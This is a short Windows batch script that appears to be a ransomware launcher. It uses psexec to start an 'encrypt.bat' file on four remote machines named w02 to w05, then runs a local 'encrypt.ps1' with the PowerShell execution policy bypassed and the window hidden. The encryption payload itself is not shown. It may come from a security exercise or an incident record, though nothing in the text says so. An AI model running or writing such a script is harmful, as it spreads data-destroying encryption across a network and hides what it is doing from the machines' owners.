@echo off
c:
cd \temp
start psexec \\w02.local c:\temp\encrypt.bat
start psexec \\w03.local c:\temp\encrypt.bat
start psexec \\w04.local c:\temp\encrypt.bat
start psexec \\w05.local c:\temp\encrypt.bat
powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden "./encrypt.ps1 yes"
